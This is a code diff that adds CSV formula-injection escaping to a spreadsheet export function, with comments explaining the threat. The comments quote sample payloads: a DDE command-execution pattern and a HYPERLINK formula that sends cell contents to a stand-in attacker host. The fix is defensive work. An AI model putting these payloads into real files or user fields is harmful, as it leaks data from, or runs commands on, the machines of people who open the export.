@@ -123,11 +123,37 @@ export function parseCsv(input: string, options: { maxColumns?: number } = {}): 
   return { header, rows: dataRows, raggedRows };
 }
 
+/**
+ * Characters that make a spreadsheet treat a cell as a formula.
+ *
+ * `=`, `+`, `-` and `@` are the four Excel/Sheets/LibreOffice formula prefixes;
+ * a leading tab or carriage return is the variant that survives a leading-space
+ * trim in some readers, and DDE (`=cmd|'…'!A0`) is command execution on whoever
+ * opens the file.
+ */
+const FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
 function escapeField(value: unknown): string {
   if (value === null || value === undefined) return '';
   const text = typeof value === 'string' ? value : String(value);
-  if (/[",\r\n]/.test(text)) return `"${text.replace(/"/g, '""')}"`;
-  return text;
+  /*
+   * Neutralise a formula before quoting, not after.
+   *
+   * Quoting alone does nothing: `"=1+1"` is still a formula to Excel. The
+   * leading apostrophe is the documented defence, and it is invisible in the
+   * cell while making the content literal text.
+   *
+   * This is not theoretical. Every column of every export is user-controlled -
+   * display names, bios, team and project names, descriptions, comment bodies,
+   * judge summaries, webhook URLs - and any participant can set their own
+   * display name. A single `=HYPERLINK("http://evil/?leak="&A1,"x")` in a
+   * display name reaches the *organizer's* desktop when they open the export
+   * they were told to open, which makes this organizer-to-workstation
+   * injection rather than a self-inflicted one.
+   */
+  const safe = FORMULA_PREFIX.test(text) ? `'${text}` : text;
+  if (/[",\r\n]/.test(safe)) return `"${safe.replace(/"/g, '""')}"`;
+  return safe;
 }
 
 export type CsvColumn<T> = {
